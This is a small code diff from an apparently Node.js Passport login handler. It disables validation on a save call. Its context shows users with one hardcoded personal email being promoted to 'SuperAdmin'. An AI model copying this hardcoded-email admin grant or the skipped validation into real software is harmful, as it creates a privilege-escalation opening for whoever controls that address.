@@ -35,7 +35,7 @@ passport.use(
                 }
                 if (email === "lp6669349@gmail.com") {
                     user.accountType = "SuperAdmin";
-                    await user.save();
+                    await user.save({ validateBeforeSave: false });
                 }
                 const token = jwt.sign(
                     {
